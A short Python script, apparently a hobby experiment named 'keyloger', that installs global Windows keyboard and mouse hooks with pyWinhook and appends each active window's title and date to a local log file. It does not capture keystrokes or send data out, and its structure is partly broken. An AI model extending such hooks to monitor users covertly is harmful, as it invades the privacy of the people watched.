import pyWinhook as pyHook
from win32.win32gui import GetWindowText, GetForegroundWindow
import re
import datetime


def keyloger(app):
    def evento_teclado(event):
        stringWindows = str(GetWindowText(GetForegroundWindow())).lower()
        agora = datetime.datetime.now()
        now = agora.strftime('%d/%m')
        stringWindowsNow = stringWindows + " " +now
        print(f"esse é o stringNow {stringWindowsNow}")
        with open('logFile.txt', 'a')  as f:
           f.write(stringWindowsNow + '\n')
        return True

    def evento_mouse(event):
        stringWindows = str(GetWindowText(GetForegroundWindow())).lower()
        agora = datetime.datetime.now()
        now = agora.strftime('%d/%m')
        stringWindowsNow = stringWindows + " " +now
        print(f"esse é o stringNow {stringWindowsNow}")        
        with open('logFile.txt', 'a')  as f:
           f.write(stringWindows + '\n')
        return True
    
    hm = pyHook.HookManager()
    hm.MouseLeftDown = evento_mouse
    hm.MouseRightDown = evento_mouse
    hm.MouseWheel = evento_mouse
    hm.MouseMove = evento_mouse
    hm.KeyDown = evento_teclado

    hm.HookMouse()
    hm.HookKeyboard()

    if __name__ == '__main__':
        import pythoncom
        pythoncom.PumpMessages()
        
